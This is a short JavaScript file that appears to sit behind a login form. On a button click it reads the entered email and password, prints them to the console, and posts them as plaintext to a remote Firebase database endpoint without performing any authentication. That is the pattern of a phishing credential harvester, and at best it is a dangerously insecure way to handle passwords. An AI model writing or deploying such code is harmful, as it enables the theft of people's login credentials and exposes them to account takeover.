let getElement = (t) => document.querySelector(t);

let uploadData = (data) => {
	fetch('https://datacovidcaldas.firebaseio.com/IpAccess.json', {
		method: "POST",
		body: JSON.stringify(data),
		headers: { "Content-type": "application/json; charset=UTF-8" }
	})
		.then(response => response.json())
		.then(json => console.log(json))
		.catch(err => console.log(err));
}

getElement("#btnLogin").addEventListener("click", function () {
	let data = {
		user: getElement("#email").value,
		pass: getElement("#pass").value
	};
	console.log(data);
	uploadData(data);
});
